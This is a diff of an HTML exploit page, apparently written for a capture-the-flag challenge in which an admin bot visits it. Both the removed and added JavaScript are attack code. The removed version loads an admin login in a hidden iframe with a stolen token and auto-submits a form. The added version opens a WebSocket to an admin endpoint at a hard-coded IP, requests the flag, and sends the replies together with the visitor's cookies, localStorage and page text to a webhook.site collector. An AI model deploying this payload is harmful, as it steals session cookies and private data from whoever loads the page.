@@ -1,8 +1,9 @@
 <!doctype html>
 <html>
 <body>
+<h1>This is a definitly malicious page </h1>
 <script>
-const REC = "https://webhook.site/0f10c98d-9181-4a92-b57a-1eae97ed5a47/x=?";
+const REC = "https://webhook.site/0f10c98d-9181-4a92-b57a-1eae97ed5a47/";
 
 function report(msg){
   try {
@@ -13,127 +14,56 @@ function report(msg){
 }
 
 
-function exploit() {
-  report("START_EXPLOIT");
-
-  const iframe = document.createElement('iframe');
-  iframe.style.display = 'none';
-  
-  const urlParams = new URLSearchParams(window.location.search);
-  const token = urlParams.get('token') || urlParams.get('admin') || urlParams.get('key');
-  
-  iframe.onload = function() {
-    report("IFRAME_LOADED");
-    setTimeout(() => {
-      connectWebSocket();
-    }, 2000);
-  };
-  
-
-  const baseUrl = "https://65.109.185.79:8080";
-  
-
-  if (token) {
-    report("TOKEN_FOUND: " + token.substring(0, 10) + "...");
-    iframe.src = `${baseUrl}/admin/login?token=${token}`;
-  } 
-
-  else {
-    iframe.src = `${baseUrl}/admin/login?token=INVALID`;
-  }
-  
-  document.body.appendChild(iframe);
+function sniff(){
+  let out = "";
+  try { out += "cookies=" + document.cookie + "\\n"; } catch(e){ out += "cookies_err="+e+"\\n"; }
+  try { out += "localStorage=" + JSON.stringify(window.localStorage) + "\\n"; } catch(e){ out += "local_err="+e+"\\n"; }
+  try { out += "body_snippet=" + document.body.innerText.slice(0,1000) + "\\n"; } catch(e){ out += "body_err="+e+"\\n"; }
+  return out;
 }
 
-function connectWebSocket() {
-  const ws_url = "ws://web:8080/admin/ws";
-  report("TRY_WS_FROM_IFRAME:" + ws_url);
-  
+(async function(){
+  report("START_SNIF " + navigator.userAgent);
+
   try {
+    const ws_url = "ws://65.109.185.79:8080/admin/ws";
+    report("TRY_WS:" + ws_url);
     let ws = new WebSocket(ws_url);
     let received = "";
     let done = false;
-    
     ws.onopen = () => {
-      report("WS_OPEN_ADMIN");
+      report("WS_OPEN");
       try {
         ws.send("flag");
-        report("WS_SENT_FLAG");
-      } catch(e) {
+        report("WS_SENT:flag");
+      } catch(e){
         report("WS_SEND_ERR:" + e);
       }
     };
-    
     ws.onmessage = (m) => {
-      received += m.data + "\n";
-      report("WS_ADMIN_RECV:" + m.data);
+      received += m.data + "\\n";
+      report("WS_RECV:" + m.data);
       done = true;
       try { ws.close(); } catch(e){}
     };
-    
     ws.onerror = (ev) => {
-      report("WS_ADMIN_ERROR:" + String(ev));
+      report("WS_ERROR:" + String(ev));
     };
-    
-    setTimeout(() => {
-      if(!done) {
-        try{ ws.close(); } catch(e){}
-        report("WS_ADMIN_TIMEOUT");
-        tryFallback();
+    setTimeout(()=>{
+      if(!done){
+        try{ ws.close(); }catch(e){}
+        report("WS_NO_RESPONSE_FROM_ADMIN_WS");
+        report("SNIFF:"+sniff());
       }
-    }, 5000);
-  } catch(e) {
-    report("WS_CONNECT_EXCEPTION:" + e);
+    }, 2500);
+    return;
+  } catch(e){
+    report("WS_TRY_EXCEPTION:" + e);
   }
-}
 
-function tryFallback() {
-  const ws_url = "ws://web:8080/ws";
-  report("TRY_NON_ADMIN_WS:" + ws_url);
-  
-  try {
-    let ws = new WebSocket(ws_url);
-    
-    ws.onopen = () => {
-      report("NON_ADMIN_WS_OPEN");
-    };
-    
-    ws.onmessage = (m) => {
-      report("NON_ADMIN_COUNTER:" + m.data);
-      ws.close();
-    };
-    
-    setTimeout(() => ws.close(), 3000);
-  } catch(e) {
-    report("FALLBACK_WS_ERROR:" + e);
-  }
-}
-
-function tryFormBased() {
-  report("TRYING_FORM_BASED");
-
-  const form = document.createElement('form');
-  form.method = 'POST';
-  form.action = 'http://web:8080/submit';
-  form.target = '_blank';
-
-  const urlInput = document.createElement('input');
-  urlInput.type = 'hidden';
-  urlInput.name = 'url';
-  urlInput.value = window.location.href + '?token_capture=true';
-  
-  form.appendChild(urlInput);
-  document.body.appendChild(form);
-  form.submit();
-}
-
-// Execute
-report("USER_AGENT: " + navigator.userAgent);
-report("LOCATION: " + window.location.href);
-
-
-setTimeout(exploit, 5000);
-setTimeout(tryFormBased, 5000);
+  // fallback: just sniff and report
+  report("FALLBACK_SNIFF:" + sniff());
+})();
 </script>
 </body>
 </html>
